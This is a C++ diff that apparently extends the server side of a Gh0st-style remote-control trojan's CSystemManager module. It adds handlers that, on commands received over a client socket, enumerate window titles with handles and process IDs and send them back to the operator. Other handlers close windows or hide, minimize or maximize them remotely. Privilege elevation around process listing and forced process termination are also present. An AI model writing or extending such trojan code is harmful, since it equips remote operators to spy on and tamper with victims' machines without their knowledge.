@@ -12,13 +12,23 @@
 #pragma comment(lib,"Psapi.lib")
 
 #include "until.h"
+
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-CSystemManager::CSystemManager(CClientSocket *pClient) : CManager(pClient)
+CSystemManager::CSystemManager(CClientSocket *pClient, BOOL bHow) : CManager(pClient)
 {
-	SendProcessList();
+	m_bHow = bHow;
+	if (m_bHow == COMMAND_SYSTEM)     //如果是获取进程
+	{
+		SendProcessList();
+	}
+	else if (m_bHow == COMMAND_WSLIST)   //如果是获取窗口
+	{
+		OutputDebugString("COMMAND_WSLIST");
+		SendWindowsList();
+	}
 }
 
 CSystemManager::~CSystemManager()
@@ -41,6 +51,13 @@ void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		break;
 	case COMMAND_KILLPROCESS:
 		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
+		break;
+	case COMMAND_WINDOW_CLOSE:
+		CloseWindow(lpBuffer + 1);  //转到函数定义
+		break;
+	case COMMAND_WINDOW_TEST:    //最大化最小化 隐藏窗口都由这个函数处理
+		TestWindow(lpBuffer + 1);    //转到定义
+		break;
 	default:
 		break;
 	}
@@ -49,7 +66,9 @@ void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 void CSystemManager::SendProcessList()
 {
 	UINT	nRet = -1;
+	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
 	LPBYTE	lpBuffer = getProcessList();
+	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, FALSE);
 	if (lpBuffer == NULL)
 		return;
 	
@@ -60,9 +79,12 @@ void CSystemManager::SendProcessList()
 void CSystemManager::SendWindowsList()
 {
 	UINT	nRet = -1;
+	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
 	LPBYTE	lpBuffer = getWindowsList();
+	DebugPrivilege(SE_SYSTEM_ENVIRONMENT_NAME, FALSE);
 	if (lpBuffer == NULL)
 		return;
+
 
 	Send((LPBYTE)lpBuffer, LocalSize(lpBuffer));
 	LocalFree(lpBuffer);	
@@ -106,9 +128,10 @@ void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
 {
 	HANDLE hProcess = NULL;
 	DebugPrivilege(SE_DEBUG_NAME, TRUE);
-	
+	DWORD n = 0;
 	for (int i = 0; i < nSize; i += 4)
 	{
+		n = *(LPDWORD)(lpBuffer + i);
 		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(lpBuffer + i));
 		TerminateProcess(hProcess, 0);
 		CloseHandle(hProcess);
@@ -119,7 +142,7 @@ void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)
 	// 刷新进程列表
 	SendProcessList();
 	// 刷新窗口列表
-	SendWindowsList();	
+	//SendWindowsList();	
 }
 
 LPBYTE CSystemManager::getProcessList()
@@ -215,8 +238,9 @@ void CSystemManager::ShutdownWindows( DWORD dwReason )
 	DebugPrivilege(SE_SHUTDOWN_NAME,FALSE);	
 }
 
-bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
+BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
 {
+	OutputDebugString("EnumWindowsProc");
 	DWORD	dwLength = 0;
 	DWORD	dwOffset = 0;
 	DWORD	dwProcessID = 0;
@@ -224,32 +248,62 @@ bool CALLBACK CSystemManager::EnumWindowsProc(HWND hwnd, LPARAM lParam)
 	
 	char	strTitle[1024];
 	memset(strTitle, 0, sizeof(strTitle));
-	GetWindowText(hwnd, strTitle, sizeof(strTitle));
-	
-	if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)
+	::GetWindowText(hwnd, strTitle, sizeof(strTitle));
+	   	
+	//if (!IsWindowVisible(hwnd) || lstrlen(strTitle) == 0)strTitle[0] == '\0'
+	if (lstrlen(strTitle) == 0)//!IsWindowVisible(hwnd) 在服务启动中会出错
+	{
 		return true;
-	
-	
-	if (lpBuffer == NULL)
-		lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
-	
-	dwLength = sizeof(DWORD) + lstrlen(strTitle) + 1;
-	dwOffset = LocalSize(lpBuffer);
-	
-	lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
-	
-	GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
-	memcpy(lpBuffer + dwOffset + sizeof(DWORD), strTitle, lstrlen(strTitle) + 1);
-	
-	*(LPBYTE *)lParam = lpBuffer;
-	
+	}
+		OutputDebugString(strTitle);
+
+		if (lpBuffer == NULL)
+			lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1);
+
+		dwLength = sizeof(DWORD) + sizeof(DWORD) + lstrlen(strTitle) + 1;
+		dwOffset = LocalSize(lpBuffer);
+
+		lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, dwOffset + dwLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
+
+
+		memcpy((lpBuffer + dwOffset), &hwnd, sizeof(DWORD));
+		dwOffset += sizeof(DWORD);
+		GetWindowThreadProcessId(hwnd, (LPDWORD)(lpBuffer + dwOffset));
+		dwOffset += sizeof(DWORD);
+		memcpy(lpBuffer + dwOffset, strTitle, lstrlen(strTitle) + 1);
+		//memcpy(lpBuffer + dwOffset + sizeof(DWORD), hwnd, sizeof(HWND) + 1);
+
+
+		*(LPBYTE*)lParam = lpBuffer;		
+
 	return true;
 }
 
 LPBYTE CSystemManager::getWindowsList()
 {
 	LPBYTE	lpBuffer = NULL;
-	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
+	::EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&lpBuffer);
 	lpBuffer[0] = TOKEN_WSLIST;
 	return lpBuffer;	
+}
+
+
+void CSystemManager::CloseWindow(LPBYTE buf)
+{
+	// TODO: 在此处添加实现代码.
+	DWORD hwnd;
+	memcpy(&hwnd, buf, sizeof(DWORD));      //得到窗口句柄 
+	::PostMessage((HWND__*)hwnd, WM_CLOSE, 0, 0); //向窗口发送关闭消息
+	SendWindowsList();
+}
+
+
+void CSystemManager::TestWindow(LPBYTE buf)
+{
+	// TODO: 在此处添加实现代码.
+	DWORD hwnd;
+	DWORD dHow;
+	memcpy((void*)&hwnd, buf, sizeof(DWORD));      //得到窗口句柄
+	memcpy(&dHow, buf + sizeof(DWORD), sizeof(DWORD));     //得到窗口处理参数
+	ShowWindow((HWND__*)hwnd, dHow);
 }
